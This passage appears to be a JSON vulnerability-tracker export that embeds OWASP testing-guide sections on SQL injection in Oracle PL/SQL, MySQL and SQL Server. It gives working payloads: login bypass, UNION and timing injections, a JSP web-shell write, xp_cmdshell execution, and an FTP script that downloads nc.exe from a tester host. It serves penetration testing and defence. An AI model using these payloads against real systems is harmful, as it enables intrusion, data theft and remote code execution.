Assessing Custom PL/SQL Web Applications\n\nDuring black box security assessments, the code of the custom PL/SQL application is not available, but it still needs to be assessed for security vulnerabilities.\n\n#### Testing for SQL Injection\n\nEach input parameter should be tested for SQL injection flaws. These are easy to find and confirm. Finding them is as easy as embedding a single quote into the parameter and checking for error responses (which include 404 Not Found errors). Confirming the presence of SQL injection can be performed using the concatenation operator.\nFor example, assume there is a bookstore PL/SQL web application that allows users to search for books by a given author:\n\u0060http://www.example.com/pls/bookstore/books.search?author=DICKENS\u0060\nIf this request returns books by Charles Dickens, but\n\u0060http://www.example.com/pls/bookstore/books.search?author=DICK\u0027ENS\u0060\nreturns an error or a \u0060404\u0060, then there might be a SQL injection flaw. This can be confirmed by using the concatenation operator:\n\u0060http://www.example.com/pls/bookstore/books.search?author=DICK\u0027||\u0027ENS\u0060\nIf this request returns books by Charles Dickens, you\u2019ve confirmed the presence of the SQL injection vulnerability.\n\n## Tools\n\n* [Orascan (Oracle Web Application VA scanner), NGS SQuirreL (Oracle RDBMS VA Scanner)](https://www.nccgroup.trust/globalassets/service-pages/documents/security-consulting/information-security-software/ncc-squirrel-suite.pdf)","Details":null,"Implication":null,"Recommendation":null,"References":"* [Hackproofing Oracle Application Server (A Guide to Securing Oracle 9)](https://www.blackhat.com/presentations/win-usa-02/litchfield-winsec02.pdf)\n* [Oracle PL/SQL Injection](https://www.oracle.com/technetwork/database/features/plsql/overview/how-to-write-injection-proof-plsql-1-129572.pdf)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/25/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"07-Input Validation Testing","Description":"07-Input Validation Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"67f3ee4c-3f91-4951-b403-c7ad60889758","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-INPV-05-2 Testing for MySQL","Severity":"High","FoundDate":"2024-06-26T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.2-Testing_for_MySQL","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.2-Testing_for_MySQL","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\n[SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection) vulnerabilities occur whenever input is used in the construction of a SQL query without being adequately constrained or sanitized. The use of dynamic SQL (the construction of SQL queries by concatenation of strings) opens the door to these vulnerabilities. SQL injection allows an attacker to access the SQL servers. It allows for the execution of SQL code under the privileges of the user used to connect to the database.\n*MySQL server* has a few particularities so that some exploits need to be specially customized for this application. That\u2019s the subject of this section.","TestingInstructions":"## How to Test\n\nWhen an SQL injection vulnerability is found in an application backed by a MySQL database, there are a number of attacks that could be performed depending on the MySQL version and user privileges on DBMS.\nMySQL comes with at least four versions which are used in production worldwide, \u00603.23.x\u0060, \u00604.0.x\u0060, \u00604.1.x\u0060 and \u00605.0.x\u0060. Every version has a set of features proportional to version number.\n\n* From Version 4.0: UNION\n* From Version 4.1: Subqueries\n* From Version 5.0: Stored procedures, Stored functions and the view named \u0060INFORMATION_SCHEMA\u0060\n* From Version 5.0.2: Triggers\n\nIt should be noted that for MySQL versions before 4.0.x, only Boolean or time-based Blind Injection attacks could be used, since the subquery functionality or \u0060UNION\u0060 statements were not implemented.\nFrom now on, we will assume that there is a classic SQL injection vulnerability, which can be triggered by a request similar to the one described in the Section on [Testing for SQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection).\n\u0060http://www.example.com/page.php?id=2\u0060\n\n### The Single Quotes Problem\n\nBefore taking advantage of MySQL features, it has to be taken in consideration how strings could be represented in a statement, as often web applications escape single quotes.\nMySQL quote escaping is the following:\n\u0060\u0027A string with \\\u0027quotes\\\u0027\u0027\u0060\nThat is, MySQL interprets escaped apostrophes \u0060\\\u0027\u0060 as characters and not as metacharacters.\nSo if the application, to work properly, needs to use constant strings, two cases are to be differentiated:\n\n1. Web app escapes single quotes \u0060\u0027\u0060 =\u003E \u0060\\\u0027\u0060\n2. Web app does not escape single quotes \u0060\u0027\u0060 =\u003E \u0060\u0027\u0060\n\nUnder MySQL, there is a standard way to bypass the need of single quotes, having a constant string to be declared without the need for single quotes.\nLet\u2019s suppose we want to know the value of a field named \u0060password\u0060 in a record, with a condition like the following:\n\n1. password like \u0060\u0027A%\u0027\u0060\n2. The ASCII values in a concatenated hex: \u0060password LIKE 0x4125\u0060\n3. The char() function: \u0060password LIKE CHAR(65,37)\u0060\n\n### Multiple Mixed Queries\n\nMySQL library connectors do not support multiple queries separated by \u0060;\u0060 so there\u2019s no way to inject multiple non-homogeneous SQL commands inside a single SQL injection vulnerability like in Microsoft SQL Server.\nFor example the following injection will result in an error:\n\u00601\u00A0;\u00A0update\u00A0tablename\u00A0set\u00A0code=\u0027javascript\u00A0code\u0027\u00A0where\u00A01\u00A0--\u0060\n\n### Information Gathering\n\n#### Fingerprinting MySQL\n\nOf course, the first thing to know is if there\u2019s MySQL DBMS as a backend database. MySQL server has a feature that is used to let other DBMS ignore a clause in MySQL dialect. When a comment block \u0060\u0027/**/\u0027\u0060 contains an exclamation mark \u0060\u0027/*! sql here*/\u0027\u0060 it is interpreted by MySQL, and is considered as a normal comment block by other DBMS as explained in [MySQL manual](https://dev.mysql.com/doc/refman/8.0/en/comments.html).\nExample:\n\u00601\u00A0/*!\u00A0and\u00A01=0\u00A0*/\u0060\n\n\u003E If MySQL is present, the clause inside the comment block will be interpreted.\n\n#### Version\n\nThere are three ways to gain this information:\n\n1. By using the global variable \u0060@@version\u0060\n2. By using the function [VERSION()](https://dev.mysql.com/doc/refman/8.0/en/information-functions.html#function_version)\n3. By using comment fingerprinting with a version number \u0060/*!40110 and 1=0*/\u0060\n\nwhich means\n\n\u0060\u0060\u0060\nif(version\u00A0\u003E=\u00A04.1.10)\n\u00A0\u00A0\u00A0add\u00A0\u0027and\u00A01=0\u0027\u00A0to\u00A0the\u00A0query.\n\u0060\u0060\u0060\n\nThese are equivalent as the result is the same.\nIn band injection:\n\u00601\u00A0AND\u00A01=0\u00A0UNION\u00A0SELECT\u00A0@@version\u00A0/*\u0060\nInferential injection:\n\u00601\u00A0AND\u00A0@@version\u00A0like\u00A0\u00274.0%\u0027\u0060\nThe response would contain something to the lines of:\n\u00605.0.22-log\u0060\n\n#### Login User\n\nThere are two kinds of users MySQL Server relies upon.\n\n1. [USER()](https://dev.mysql.com/doc/refman/8.0/en/information-functions.html#function_user): the user connected to the MySQL Server.\n2. [CURRENT_USER()](https://dev.mysql.com/doc/refman/8.0/en/information-functions.html#function_current-user): the internal user who is executing the query.\n\nThere is some difference between 1 and 2. The main one is that an anonymous user could connect (if allowed) with any name, but the MySQL internal user is an empty name (\u2018\u2019). Another difference is that a stored procedure or a stored function are executed as the creator user, if not declared elsewhere. This can be known by using \u0060CURRENT_USER\u0060.\nIn band injection:\n\u00601\u00A0AND\u00A01=0\u00A0UNION\u00A0SELECT\u00A0USER()\u0060\nInferential injection:\n\u00601\u00A0AND\u00A0USER()\u00A0like\u00A0\u0027root%\u0027\u0060\nThe response would contain something to the lines of:\n\u0060user@hostname\u0060\n\n#### Database Name in Use\n\nThere is the native function \u0060DATABASE()\u0060\nIn band injection:\n\u00601\u00A0AND\u00A01=0\u00A0UNION\u00A0SELECT\u00A0DATABASE()\u0060\nInferential injection:\n\u00601\u00A0AND\u00A0DATABASE()\u00A0like\u00A0\u0027db%\u0027\u0060\n\n\u003E Expected Result, A string like this:\n\u003E \u0060dbname\u0060\n\n#### INFORMATION\\_SCHEMA\n\nFrom MySQL 5.0 a view named [INFORMATION_SCHEMA](https://dev.mysql.com/doc/refman/8.0/en/information-schema.html) was created. It allows us to get all the information about databases, tables, and columns, as well as procedures and functions.\n\n| Tables\\_in\\_INFORMATION\\_SCHEMA | DESCRIPTION |\n| ---------------------------- | ----------- |\n| SCHEMATA | All databases the user has (at least) SELECT\\_priv |\n| SCHEMA\\_PRIVILEGES | The privileges the user has for each DB |\n| TABLES | All tables the user has (at least) SELECT\\_priv |\n| TABLE\\_PRIVILEGES | The privileges the user has for each table |\n| COLUMNS | All columns the user has (at least) SELECT\\_priv |\n| COLUMN\\_PRIVILEGES | The privileges the user has for each column |\n| VIEWS | All columns the user has (at least) SELECT\\_priv |\n| ROUTINES | Procedures and functions (needs EXECUTE\\_priv) |\n| TRIGGERS | Triggers (needs INSERT\\_priv) |\n| USER\\_PRIVILEGES | Privileges connected User has |\n\nAll of this information could be extracted by using known techniques as described in SQL Injection section.\n\n### Attack Vectors\n\n#### Write in a File\n\nIf the connected user has \u0060FILE\u0060 privileges and single quotes are not escaped, the \u0060into outfile\u0060 clause can be used to export query results in a file.\n\u0060Select\u00A0*\u00A0from\u00A0table\u00A0into\u00A0outfile\u00A0\u0027/tmp/file\u0027\u0060\nNote: there is no way to bypass single quotes surrounding a filename. So if there\u2019s some sanitization on single quotes like escape \u0060\\\u0027\u0060 there will be no way to use the \u0060into outfile\u0060 clause.\nThis kind of attack could be used as an out-of-band technique to gain information about the results of a query or to write a file which could be executed inside the web server directory.\nExample:\n\u00601\u00A0limit\u00A01\u00A0into\u00A0outfile\u00A0\u0027/var/www/root/test.jsp\u0027\u00A0FIELDS\u00A0ENCLOSED\u00A0BY\u00A0\u0027//\u0027\u00A0\u00A0LINES\u00A0TERMINATED\u00A0BY\u00A0\u0027\\n\u003C%jsp\u00A0code\u00A0here%\u003E\u0027;\u0060\n\n\u003E Results are stored in a file with \u0060rw-rw-rw\u0060 privileges owned by MySQL user and group.\n\u003E Where \u0060/var/www/root/test.jsp\u0060 will contain:\n\u003E \u0060//field\u00A0values//\u0060 \u0060\u003C%jsp\u00A0code\u00A0here%\u003E\u0060\n\n#### Read from a File\n\n\u0060load_file\u0060 is a native function that can read a file when allowed by the file system permissions. If a connected user has \u0060FILE\u0060 privileges, it could be used to get the files\u2019 content. Single quotes escape sanitization can by bypassed by using previously described techniques.\n\u0060load_file(\u0027filename\u0027)\u0060\n\n\u003E The whole file will be available for exporting by using standard techniques.\n\n### Standard SQL Injection Attack\n\nIn a standard SQL injection you can have results displayed directly in a page as normal output or as a MySQL error. By using already mentioned SQL Injection attacks and the already described MySQL features, direct SQL injection could be easily accomplished at a level depth depending primarily on the MySQL version the pentester is facing.\nA good attack is to know the results by forcing a function/procedure or the server itself to throw an error. A list of errors thrown by MySQL and in particular native functions could be found on [MySQL Manual](https://dev.mysql.com/doc/mysql-errors/8.0/en/server-error-reference.html).\n\n### Out of Band SQL Injection\n\nOut of band injection could be accomplished by using the [\u0060into outfile\u0060](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.2-Testing_for_MySQL#write-in-a-file) clause.\n\n### Blind SQL Injection\n\nFor blind SQL injection, there is a set of useful function natively provided by MySQL server.\n\n* String Length:\n    * \u0060LENGTH(str)\u0060\n* Extract a substring from a given string:\n    * \u0060SUBSTRING(string, offset, #chars_returned)\u0060\n* Time based Blind Injection:\n    * BENCHMARK and SLEEP \u0060BENCHMARK(#ofcycles,action_to_be_performed)\u0060 The benchmark function could be used to perform timing attacks when blind injection by boolean values does not yield any results. See. \u0060SLEEP()\u0060 (MySQL \u003E 5.0.x) for an alternative on benchmark.\n\nFor a complete list, refer to the [MySQL manual](https://dev.mysql.com/doc/refman/8.0/en/functions.html)\n\n## Tools\n\n* [Francois Larouche: Multiple DBMS SQL Injection tool](http://www.sqlpowerinjector.com/index.htm)\n* [Bernardo Damele A. G.: sqlmap, automatic SQL injection tool](https://sqlmap.org/)\n* [Muhaimin Dzulfakar: MySqloit, MySql Injection takeover tool](https://code.google.com/archive/p/mysqloit/)","Details":null,"Implication":null,"Recommendation":null,"References":"### Whitepapers\n\n* [Chris Anley: \u201CHackproofing MySQL\u201D](https://www.securitylab.ru/_Article_Images/2004/HackproofingMySQL.pdf)\n\n### Case Studies\n\n* [Zeelock: Blind Injection in MySQL Databases](https://archive.cert.uni-stuttgart.de/bugtraq/2005/02/msg00289.html)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/26/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"07-Input Validation Testing","Description":"07-Input Validation Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"67f3ee4c-3f91-4951-b403-c7ad60889758","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-INPV-05-3 Testing for SQL Server","Severity":"High","FoundDate":"2024-06-26T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.3-Testing_for_SQL_Server","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.3-Testing_for_SQL_Server","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nIn this section some [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection) techniques that utilize specific features of Microsoft SQL Server will be discussed.\nSQL injection vulnerabilities occur whenever input is used in the construction of an SQL query without being adequately constrained or sanitized. The use of dynamic SQL (the construction of SQL queries by concatenation of strings) opens the door to these vulnerabilities. SQL injection allows an attacker to access the SQL servers and execute SQL code under the privileges of the user used to connect to the database.\nAs explained in [SQL injection](https://owasp.org/www-community/attacks/SQL_Injection), a SQL-injection exploit requires two things: an entry point, and an exploit to enter. Any user-controlled parameter that gets processed by the application might be hiding a vulnerability. This includes:\n\n* Application parameters in query strings (e.g., GET requests)\n* Application parameters included as part of the body of a POST request\n* Browser-related information (e.g., user-agent, referrer)\n* Host-related information (e.g., hostname, IP)\n* Session-related information (e.g., user ID, cookies)\n\nMicrosoft SQL server has a few unique characteristics, so some exploits need to be specially customized for this application.","TestingInstructions":"## How to Test\n\n### SQL Server Characteristics\n\nTo begin, let\u2019s see some SQL Server operators and commands/stored procedures that are useful in a SQL Injection test:\n\n* comment operator: \u0060--\u0060 (useful for forcing the query to ignore the remaining portion of the original query; this won\u2019t be necessary in every case)\n* query separator: \u0060;\u0060 (semicolon)\n* Useful stored procedures include:\n    * [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql) executes any command shell in the server with the same permissions that it is currently running. By default, only \u0060sysadmin\u0060 is allowed to use it and in SQL Server 2005 it is disabled by default (it can be enabled again using sp\\_configure)\n    * \u0060xp_regread\u0060 reads an arbitrary value from the Registry (undocumented extended procedure)\n    * \u0060xp_regwrite\u0060 writes an arbitrary value into the Registry (undocumented extended procedure)\n    * [sp_makewebtask](https://docs.microsoft.com/en-us/previous-versions/sql/sql-server-2008/ms180099(v=sql.100)) Spawns a Windows command shell and passes in a string for execution. Any output is returned as rows of text. It requires \u0060sysadmin\u0060 privileges.\n    * [xp_sendmail](https://docs.microsoft.com/en-us/previous-versions/sql/sql-server-2008-r2/ms189505(v=sql.105)) Sends an email message, which may include a query result set attachment, to the specified recipients. This extended stored procedure uses SQL Mail to send the message.\n\nLet\u2019s see now some examples of specific SQL Server attacks that use the aforementioned functions. Most of these examples will use the \u0060exec\u0060 function.\nBelow we show how to execute a shell command that writes the output of the command \u0060dir c:\\inetpub\u0060 in a browseable file, assuming that the web server and the DB server reside on the same host. The following syntax uses \u0060xp_cmdshell\u0060:\n\u0060exec master.dbo.xp_cmdshell \u0027dir c:\\inetpub \u003E c:\\inetpub\\wwwroot\\test.txt\u0027--\u0060\nAlternatively, we can use \u0060sp_makewebtask\u0060:\n\u0060exec sp_makewebtask \u0027C:\\Inetpub\\wwwroot\\test.txt\u0027, \u0027select * from master.dbo.sysobjects\u0027--\u0060\nA successful execution will create a file that can be browsed by the pen tester. Keep in mind that \u0060sp_makewebtask\u0060 is deprecated, and, even if it works in all SQL Server versions up to 2005, it might be removed in the future.\nIn addition, SQL Server built-in functions and environment variables are very handy. The following uses the function \u0060db_name()\u0060 to trigger an error that will return the name of the database:\n\u0060/controlboard.asp?boardID=2\u0026itemnum=1%20AND%201=CONVERT(int,%20db_name())\u0060\nNotice the use of [convert](https://docs.microsoft.com/en-us/sql/t-sql/functions/cast-and-convert-transact-sql?view=sql-server-2017):\n\u0060CONVERT ( data_type [ ( length ) ] , expression [ , style ] )\u0060\n\u0060CONVERT\u0060 will try to convert the result of \u0060db_name\u0060 (a string) into an integer variable, triggering an error, which, if displayed by the vulnerable application, will contain the name of the DB.\nThe following example uses the environment variable \u0060@@version\u0060, combined with a \u0060union select\u0060-style injection, in order to find the version of the SQL Server.\n\u0060/form.asp?prop=33%20union%20select%201,2006-01-06,2007-01-06,1,\u0027stat\u0027,\u0027name1\u0027,\u0027name2\u0027,2006-01-06,1,@@version%20--\u0060\nAnd here\u2019s the same attack, but using again the conversion trick:\n\u0060/controlboard.asp?boardID=2\u0026itemnum=1%20AND%201=CONVERT(int,%20@@VERSION)\u0060\nInformation gathering is useful for exploiting software vulnerabilities at the SQL Server, through the exploitation of an SQL-injection attack or direct access to the SQL listener.\nIn the following, we show several examples that exploit SQL injection vulnerabilities through different entry points.\n\n### Example 1: Testing for SQL Injection in a GET Request\n\nThe most simple (and sometimes most rewarding) case would be that of a login page requesting an username and password for user login. You can try entering the following string \u201C\u2019 or \u20181\u2019=\u20191\u201D (without double quotes):\n\u0060https://vulnerable.web.app/login.asp?Username=\u0027%20or%20\u00271\u0027=\u00271\u0026Password=\u0027%20or%20\u00271\u0027=\u00271\u0060\nIf the application is using Dynamic SQL queries, and the string gets appended to the user credentials validation query, this may result in a successful login to the application.\n\n### Example 2: Testing for SQL Injection in a GET Request\n\nIn order to learn how many columns exist\n\u0060https://vulnerable.web.app/list_report.aspx?number=001%20UNION%20ALL%201,1,\u0027a\u0027,1,1,1%20FROM%20users;--\u0060\n\n### Example 3: Testing in a POST Request\n\nSQL Injection, HTTP POST Content: \u0060email=%27\u0026whichSubmit=submit\u0026submit.x=0\u0026submit.y=0\u0060\nA complete post example (\u0060https://vulnerable.web.app/forgotpass.asp\u0060):\n\n\u0060\u0060\u0060\nPOST\u00A0/forgotpass.asp\u00A0HTTP/1.1\nHost:\u00A0vulnerable.web.app\n[...]\nReferer:\u00A0http://vulnerable.web.app/forgotpass.asp\nContent-Type:\u00A0application/x-www-form-urlencoded\nContent-Length:\u00A050\n\nemail=%27\u0026whichSubmit=submit\u0026submit.x=0\u0026submit.y=0\n\u0060\u0060\u0060\n\nThe error message obtained when a \u0060\u0027\u0060 (single quote) character is entered at the email field is:\n\n\u0060\u0060\u0060\nMicrosoft\u00A0OLE\u00A0DB\u00A0Provider\u00A0for\u00A0SQL\u00A0Server\u00A0error\u00A0\u002780040e14\u0027\nUnclosed\u00A0quotation\u00A0mark\u00A0before\u00A0the\u00A0character\u00A0string\u00A0\u0027\u0027\u00A0\u0027.\n/forgotpass.asp,\u00A0line\u00A015\n\u0060\u0060\u0060\n\n### Example 4: Yet Another (Useful) GET Example\n\nObtaining the application\u2019s source code\n\u0060a\u0027\u00A0;\u00A0master.dbo.xp_cmdshell\u00A0\u0027\u00A0copy\u00A0c:\\inetpub\\wwwroot\\login.aspx\u00A0c:\\inetpub\\wwwroot\\login.txt\u0027;--\u0060\n\n### Example 5: Custom \u0060xp_cmdshell\u0060\n\nAll books and papers describing the security best practices for SQL Server recommend disabling \u0060xp_cmdshell\u0060 in SQL Server 2000 (in SQL Server 2005 it is disabled by default). However, if we have sysadmin rights (natively or by bruteforcing the sysadmin password, see below), we can often bypass this limitation.\nOn SQL Server 2000:\n\n* If \u0060xp_cmdshell\u0060 has been disabled with \u0060sp_dropextendedproc\u0060, we can simply inject the following code:\n\n\u0060sp_addextendedproc \u0027xp_cmdshell\u0027,\u0027xp_log70.dll\u0027\u0060\n\n* If the previous code does not work, it means that the \u0060xp_log70.dll\u0060 has been moved or deleted. In this case we need to inject the following code:\n\n\u0060\u0060\u0060\nCREATE PROCEDURE xp_cmdshell(@cmd varchar(255), @Wait int = 0) AS\n    DECLARE @result int, @OLEResult int, @RunResult int\n    DECLARE @ShellID int\n    EXECUTE @OLEResult = sp_OACreate \u0027WScript.Shell\u0027, @ShellID OUT\n    IF @OLEResult \u003C\u003E 0 SELECT @result = @OLEResult\n    IF @OLEResult \u003C\u003E 0 RAISERROR (\u0027CreateObject %0X\u0027, 14, 1, @OLEResult)\n    EXECUTE @OLEResult = sp_OAMethod @ShellID, \u0027Run\u0027, Null, @cmd, 0, @Wait\n    IF @OLEResult \u003C\u003E 0 SELECT @result = @OLEResult\n    IF @OLEResult \u003C\u003E 0 RAISERROR (\u0027Run %0X\u0027, 14, 1, @OLEResult)\n    EXECUTE @OLEResult = sp_OADestroy @ShellID\n    return @result\n\u0060\u0060\u0060\n\nThis code, written by Antonin Foller (see links at the bottom of the page), creates a new \u0060xp_cmdshell\u0060 using \u0060sp_oacreate\u0060, \u0060sp_oamethod\u0060 and \u0060sp_oadestroy\u0060 (as long as they haven\u2019t been disabled too, of course). Before using it, we need to delete the first \u0060xp_cmdshell\u0060 we created (even if it was not working), otherwise the two declarations will collide.\nOn SQL Server 2005, \u0060xp_cmdshell\u0060 can be enabled by injecting the following code instead:\n\n\u0060\u0060\u0060\nmaster..sp_configure \u0027show advanced options\u0027,1\nreconfigure\nmaster..sp_configure \u0027xp_cmdshell\u0027,1\nreconfigure\n\u0060\u0060\u0060\n\n### Example 6: Referer / User-Agent\n\nThe \u0060REFERER\u0060 header set to:\n\u0060Referer:\u00A0https://vulnerable.web.app/login.aspx\u0027,\u00A0\u0027user_agent\u0027,\u00A0\u0027some_ip\u0027);\u00A0[SQL\u00A0CODE]--\u0060\nAllows the execution of arbitrary SQL Code. The same happens with the User-Agent header set to:\n\u0060User-Agent:\u00A0user_agent\u0027,\u00A0\u0027some_ip\u0027);\u00A0[SQL\u00A0CODE]--\u0060\n\n### Example 7: SQL Server as a Port Scanner\n\nIn SQL Server, one of the most useful (at least for the penetration tester) commands is OPENROWSET, which is used to run a query on another DB Server and retrieve the results. The penetration tester can use this command to scan ports of other machines in the target network, injecting the following query:\n\u0060select * from OPENROWSET(\u0027SQLOLEDB\u0027,\u0027uid=sa;pwd=foobar;Network=DBMSSOCN;Address=x.y.w.z,p;timeout=5\u0027,\u0027select 1\u0027)--\u0060\nThis query will attempt a connection to the address x.y.w.z on port p. If the port is closed, the following message will be returned:\n\u0060SQL Server does not exist or access denied\u0060\nOn the other hand, if the port is open, one of the following errors will be returned:\n\u0060General network error. Check your network documentation\u0060\n\u0060OLE DB provider \u0027sqloledb\u0027 reported an error. The provider did not give any information about the error.\u0060\nOf course, the error message is not always available. If that is the case, we can use the response time to understand what is going on: with a closed port, the timeout (5 seconds in this example) will be consumed, whereas an open port will return the result right away.\nKeep in mind that OPENROWSET is enabled by default in SQL Server 2000 but disabled in SQL Server 2005.\n\n### Example 8: Upload of Executables\n\nOnce we can use \u0060xp_cmdshell\u0060 (either the native one or a custom one), we can easily upload executables on the target DB Server. A very common choice is \u0060netcat.exe\u0060, but any trojan will be useful here. If the target is allowed to start FTP connections to the tester\u2019s machine, all that is needed is to inject the following queries:\n\n\u0060\u0060\u0060\nexec master..xp_cmdshell \u0027echo open ftp.tester.org \u003E ftpscript.txt\u0027;--\nexec master..xp_cmdshell \u0027echo USER \u003E\u003E ftpscript.txt\u0027;--\nexec master..xp_cmdshell \u0027echo PASS \u003E\u003E ftpscript.txt\u0027;--\nexec master..xp_cmdshell \u0027echo bin \u003E\u003E ftpscript.txt\u0027;--\nexec master..xp_cmdshell \u0027echo get nc.exe \u003E\u003E ftpscript.txt\u0027;--\nexec master..xp_cmdshell \u0027echo quit \u003E\u003E ftpscript.txt\u0027;--\nexec master..xp_cmdshell \u0027ftp -s:ftpscript.txt\u0027;--\n\u0060\u0060\u0060\n\nAt this point, \u0060nc.exe\u0060 will be uploaded and available.\nIf FTP is not allowed by the firewall, we have a workaround that exploits the Windows debugger, \u0060debug.exe\u0060, that is installed by default in all Windows machines. \u0060Debug.exe\u0060 is scriptable and is able to create an executable by executing an appropriate script file. What we need to do is to convert the executable into a debug script (which is a 100% ASCII file), upload it line by line and finally call \u0060debug.exe\u0060 on it. There are several tools that create such debug files (e.g.: \u0060makescr.exe\u0060 by Ollie Whitehouse and \u0060dbgtool.exe\u0060 by \u0060toolcrypt.org\u0060). The queries to inject will therefore be the following:\n\n\u0060\u0060\u0060\nexec master..xp_cmdshell \u0027echo [debug script line #1 of n] \u003E debugscript.txt\u0027;--\nexec master..xp_cmdshell \u0027echo [debug script line #2 of n] \u003E\u003E debugscript.txt\u0027;--\n....\nexec master..xp_cmdshell \u0027echo [debug script line #n of n] \u003E\u003E debugscript.txt\u0027;--\nexec master..xp_cmdshell \u0027debug.exe \u003C debugscript.txt\u0027;--\n\u0060\u0060\u0060\n\nAt this point, our executable is available on the target machine, ready to be executed. There are tools that automate this process, most notably \u0060Bobcat\u0060, which runs on Windows, and \u0060Sqlninja\u0060, which runs on Unix (See the tools at the bottom of this page).\n\n### Obtain Information When It Is Not Displayed (Out of Band)\n\nNot all is lost when the web application does not return any information \u2013such as descriptive error messages (cf. [Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection)). For example, it might happen that one has access to the source code (e.g., because the web application is based on an open source software). Then, the pen tester can exploit all the SQL injection vulnerabilities discovered offline in the web application. Although an IPS might stop some of these attacks, the best way would be to proceed as follows: develop and test the attacks in a testbed created for that purpose, and then execute these attacks against the web application being tested.\nOther options for out of band attacks are described in [Sample 4 above](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.3-Testing_for_SQL_Server#example-4-yet-another-useful-get-example).\n\n### Blind SQL Injection Attacks\n\n#### Trial and Error\n\nAlternatively, one may play lucky. That is the attacker may assume that there is a blind or out-of-band SQL injection vulnerability in a the web application. He will then select an attack vector (e.g., a web entry), [use fuzz vectors](https://owasp.org/www-project-web-security-testing-guide/latest/6-Appendix/C-Fuzz_Vectors.md) against this channel and watch the response. For example, if the web application is looking for a book using a query\n\n\u0060\u0060\u0060\nselect\u00A0*\u00A0from\u00A0books\u00A0where\u00A0title=\u0022text entered by the user\u0022\n\u0060\u0060\u0060\n\nthen the penetration tester might enter the text: \u0060\u0027Bomba\u0027 OR 1=1-\u0060 and if data is not properly validated, the query will go through and return the whole list of books. This is evidence that there is a SQL injection vulnerability. The penetration tester might later \u0060play\u0060 with the queries in order to assess the criticality of this vulnerability.\n\n\u003E ***NOTE:*** Take care when injecting the condition OR 1=1 into a SQL query. Although this may be harmless in the initial context you\u2019re injecting into, it\u2019s common for applications to use data from a single request in multiple different queries. If your condition reaches an UPDATE or DELETE statement, for example, this can result in an accidental loss of data.\n\n#### If Multiple Error Messages Displayed\n\nOn the other hand, if no prior information is available, there is still a possibility of attacking by exploiting any \u0060covert channel\u0060. It might happen that descriptive error messages are stopped, yet the error messages give some information. For example:\n\n* In some cases the web application (actually the web server) might return the traditional \u0060500: Internal Server Error\u0060, say when the application returns an exception that might be generated, for instance, by a query with unclosed quotes.\n* While in other cases the server will return a \u0060200 OK\u0060 message, but the web application will return some error message inserted by the developers \u0060Internal server error\u0060 or \u0060bad data\u0060.\n\nThis one bit of information might be enough to understand how the dynamic SQL query is constructed by the web application and tune up an exploit. Another out-of-band method is to output the results through HTTP browseable files.\n\n#### Timing Attacks\n\nThere is one more possibility for making a blind SQL injection attack when there is not visible feedback from the application: by measuring the time that the web application takes to answer a request. An attack of this sort is [described by Anley](http://www.encription.co.uk/downloads/more_advanced_sql_injection.pdf) from where we take the next examples. A typical approach uses the \u0060waitfor delay\u0060 command: let\u2019s say that the attacker wants to check if the \u0060pubs\u0060 sample database exists, he will simply inject the following command:\n\u0060if\u00A0exists\u00A0(select\u00A0*\u00A0from\u00A0pubs..pub_info)\u00A0waitfor\u00A0delay\u00A0\u00270:0:5\u0027\u0060\nDepending on the time that the query takes to return, we will know the answer. In fact, what we have here is two things: a \u0060SQL injection vulnerability\u0060 and a \u0060covert channel\u0060 that allows the penetration tester to get 1 bit of information for each query. Hence, using several queries (as many queries as bits in the required information) the pen tester can get any data that is in the database. Look at the following 